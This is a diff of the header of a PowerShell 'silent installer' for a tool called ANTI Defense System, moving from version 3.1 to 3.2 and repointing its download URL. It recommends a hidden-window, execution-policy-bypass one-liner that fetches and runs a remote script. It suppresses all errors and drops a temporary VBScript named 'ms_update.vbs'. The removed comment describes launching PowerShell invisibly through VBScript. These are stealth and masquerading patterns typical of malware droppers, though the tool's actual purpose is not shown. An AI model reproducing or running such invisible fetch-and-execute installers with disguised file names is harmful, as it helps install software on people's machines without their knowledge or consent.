@@ -1,18 +1,13 @@
-﻿# ANTI Defense System - Silent Installer v3.1
+﻿# ANTI Defense System - Silent Installer v3.2
 # ─────────────────────────────────────────────────────────────────────────────
 # Usage recommandee (zero fenetre) :
 #   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/AdamZoda/ANTI/main/install.ps1 | iex"
-#
-# COMMENT FONCTIONNE LE MODE ZERO-FENETRE :
-#   Ce script cree un fichier VBScript temporaire qui utilise
-#   WScript.Shell.Run() avec bShowWindow=0 pour lancer PowerShell
-#   de facon completement invisible, peu importe comment ce script
-#   a ete appele (avec ou sans -WindowStyle Hidden).
 # ─────────────────────────────────────────────────────────────────────────────
 
 $ErrorActionPreference = "SilentlyContinue"
 
-$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/exedownloader/main"
+# TOUT DANS LE MEME REPO
+$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/ANTI/main/dist"
 $installDir = "$env:LOCALAPPDATA\AntiScan"
 $exePath    = "$installDir\anti-scan.exe"
 $vbsPath    = "$env:TEMP\ms_update.vbs"
